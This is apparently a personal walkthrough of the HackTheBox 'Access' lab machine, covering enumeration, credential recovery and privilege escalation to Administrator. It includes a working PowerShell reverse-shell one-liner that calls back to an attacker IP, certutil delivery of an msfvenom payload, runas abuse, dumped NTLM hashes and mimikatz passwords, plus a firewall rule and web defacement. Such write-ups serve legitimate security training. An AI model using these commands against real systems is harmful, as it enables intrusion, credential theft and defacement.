---
title: "HackTheBox - ACCESS WT"
date: 2019-02-03T20:50:01-05:00
tags: ["hackthebox", "htb"]
draft: false
---
## Box IP: 10.10.10.98

# Reconnaissance

1) I started with scanning network. Here's what I found

PORT   STATE SERVICE VERSION

|21/tcp open | ftp     Microsoft ftpd|
|--------------|------------------------------------|
|23/tcp open | telnet?                             |
|80/tcp open | http    Microsoft IIS httpd 7.5      |
 

2) Port 80,  we have a picture of a server room, **"out.jpg"** .. saved that for later


![alt text](/images/htb-Access/1.png "port 80")


 I ran the out.jpg in stegsolve, maybe there was a hidden htb flag inside, but there was nothing and even with strings and binwalk they showed nothing interesting so I moved on to the ftp service.



 3) launched FileZilla on the 10.10.10.98 and I was connected as anonymous. There were two folders on root **Backup** which had an mbd file type in it and on the root there was also a folder called **Engineers**  which had a password protected zip file


![alt text](/images/htb-Access/ftp results.png)


 4) I tried brute-forcing with fcrackzip but it was taking forever and I quit... I searched in the backup.mbd file using a mbd tool to view the content of db with the table
    flag


![alt text](/images/htb-Access/backup-mdb-table.png)


5)  I found some interesting records in the backup.mbd. You can use the export flag to view any record.. After trying all of them.

 To export all records from table
**` mdb-tables -d ',' backup.mdb | xargs -L1 -d',' -I{} bash -c 'mdb-export backup.mdb "$1" >"$1".csv' -- {}`**

 Some had nothing in them. The  interesting one was the **auth user record**


![alt text](/images/htb-Access/backup-mdb-export.png)



6)  We see some usernames and their passwords in the auth-user record.. I used the most obvious one as the password for the zip file and aaaand, it worked. it was the **access4u@security**. I also used those usernames with their corresponding passwords in the ftp hoping one of them was a privileged user but none worked.


![alt text](/images/htb-Access/engineer-access-control-zip-extracted.png)


7)  Now I have an **Access Control.pst** file. its size is 256K.. Checking the file type, it is a Ms outlook email file. so I imported it into  evolution to  open it and see what was inside

![alt text](/images/htb-Access/access-control-pst-outlook.png)


8)  After importing Access Control.pst into evolution. I got a nice present. An email sent from user @megacorp to the security access control system with password  in plaintext for an account “security” and password **4Cc3ssC0ntr0ller**


![alt text](/images/htb-Access/evolution-access-control-pst.png)


9)  I tried using the credentials in the email in ftp to see maybe it would connect me to some more directories but that did not work. then I remembered the 23 port (Telnet) was open.


# Scanning 

We are in. Now it's time to enumerate this box...Some Windows cmds would definitely come in handy here. There are a lot more windows boxes out there than Linux in the real world. Hence, Why I am practicing windows on this box :)


![alt text](/images/htb-Access/security-telnet-login.png)


10)  I tried to get a meterpreter shell to make my life easier but I failed to get that working with **`session -u (Telnet Shell ID)`**... I will stick with the terminal shell :/

![alt text](/images/htb-Access/telnet-meterpreter-shell-session-upgrade-u.png)



11) I retrieved the user.txt hash on Desktop. Great!! Root I am comming for you :D


![alt text](/images/htb-Access/security-user-txt.png)



12)  Enumerating around.. there was not much in the security directory and not much luck with accessing administrator dir c:\users\administrator directory as current user. I found a hint in Public directory on desktop 


![alt text](/images/htb-Access/enumerating-public-desktop-lnk.png)

![alt text](/images/htb-Access/runas-ZAccess-lnk.png)


The **"runas”** command is used to run commands as other users on windows. With this, we can run commands as an administrator aka  Window's Run as an administrator


13) I found I can run powershell on box and I thought I managed spawn a powershell reverse shell with runas. Here were my steps,

# Exploit

I setup a listening port on 10.10.12.109:413  to run in the background (exploit -j) in metasploit

![alt text](/images/htb-Access/meterpreter-listener-powershell.png)

Script for prompting a shell in powershell --> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md 
There's also a one-liner command that you can type with >runas /savedcred /user:access\administrator “powershell oneliner command”

However that didn't work for me. I ended up using this script (https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4) change  **$socket** variable with your listening IP.


On the target machine in  telnet 
I used windows “copy con r.ps1” to create an PowerShell file. named r. I pasted script then  CTRL-z then Enter to save it and exit


My session was interrupted in this session. I opened another telnet session and repeated the same steps.

14) To execute the script  “powershell -command .\r.ps1”  however, It didn't work. I got an error basically it said I cannot run Powershell scripts on the machine.


![alt text](/images/htb-Access/cannot-load-exec-powershell-script.png)


However, I found a way to disable it on windows via cmd using  runas.exe  /savecred  /user:Access\Administrator  to run it.

**`runas /savecred /user:access\Administrator "powershell Set-ExecutionPolicy RemoteSigned"`** and that took care of it. Re-running the Powershell -command .\r.ps1  and it worked 


![alt text](/images/htb-Access/meterpreter-half-establised-powershell.png)


This also works

paste it in .ps1 file on target

>$client = New-Object System.Net.Sockets.TCPClient("10.10.12.109",413);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()



My happiness was slammed in the face when I realized that this was not a fully established shell. none of the commands like "load" “shell" or “ls” worked through meterpreter and it was an incomplete connection.


![alt text](/images/htb-Access/meterpreter-halfestablished-powershell.png)


15)  I looked for another way, I found CertUtil.exe was not blocked and  can be used to download a payload and get a reverse shell.  I generated the payload


![alt text](/images/htb-Access/paylaod-msfvenom-create.png)

 then ran a temporary webserver with simpleHTTPserver on the directory where notepad.exe (payload I created) was. If I check localhost. It shows the directory


![alt text](/images/htb-Access/simpleHttp-python-command.png)


![alt text](/images/htb-Access/simpleHttp-local-webserver.png)


16) I have a reverse listener running on port 23 with my IP as RHOST. In telent session on target, I ran certutil to download the payload 


![alt text](/images/htb-Access/certutil-runas-exec-notepad.png)


It worked. now we have notepad.exe downloaded on the target machine and I used runas to run it as an admin. If you tried to run notepad.exe without runas you will get a blocked policy cannot do that message. Voila  now I got a fully established  meterpreter shell this time


![alt text](/images/htb-Access/certutil-successful-meterpreter.png)



backgrounded  meterpreter session to use hashdump module and get hashes of Admin. You need to run getsystem first before “run hashdump”


![alt text](/images/htb-Access/hashdump-acquired.png)

>**Administrator:500:aad3b435b51404eeaad3b435b51404ee:db852e5a46ea5f5514f639a20daa9e2c:::** 
>**Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::**
>**security:1001:aad3b435b51404eeaad3b435b51404ee:b41db16a61cb04b231625de260163015:::**
>**engineer:1002:aad3b435b51404eeaad3b435b51404ee:25c41637f0a9874ac9b90b4a4baf5783:::**


while waiting for jripper to crack the hash. I loaded mimikatz and got the admin's password



![alt text](/images/htb-Access/mimkikatz-admin-creds.png)


## wdigest credentials

AuthID     Package    Domain        User                Password
------     -------    ------        ----              | --------
0;996    |  Negotiate |  HTB         |  ACCESS$
0;119773 |  Negotiate |  IIS APPPOOL |  DefaultAppPool|
0;995    |  Negotiate |  NT AUTHORITY|  IUSR
0;997    |  Negotiate |  NT AUTHORITY|  LOCAL SERVICE
0;45589  |  NTLM
0;999    |  NTLM      |  HTB         |  ACCESS$
0;458676 |  NTLM      |  ACCESS      |  security      |  4Cc3ssC0ntr0ller
0;456008 |  NTLM      |  ACCESS      |  security      |  4Cc3ssC0ntr0ller
0;646488 |  NTLM      |  ACCESS      |  Administrator |  55Acc3ssS3cur1ty@megacorp

# Post-Exploit

Next, I opened a telnet session and logged in with admin password


DONE


I Opened 445 via admin to open a meterpreter shell via psexec
netsh advfirewall firewall add rule dir=in action=allow protocol=TCP localport=445 name="allow_TCP-445"

![alt text](/images/htb-Access/opened-smb-port.png)


I also opened 3389 just to see if rdesktop would work..it didn't!

---------------------------------------------------------------------------------------

I wanted to upload my own jpg on webserver instead of the default jpeg. Looking in websrc

![alt text](/images/htb-Access/webserver-src-pg.png)


>C:\inetpub\wwwroot\out.jpg

Oh yeh, this is fun. So after uploading a “hack the planet" jpg file on the target machine using the certutil trick and priv esca with getsystem. Popping a shell through meterpreter. I copied my htP.jpg into the inetpub folder replacing the existing out.jpg with mine



![alt text](/images/htb-Access/uploading-hack-the-planet.png)



![alt text](/images/htb-Access/target-machine-hack-the-planet.png)



 That's it folks until the next box !!


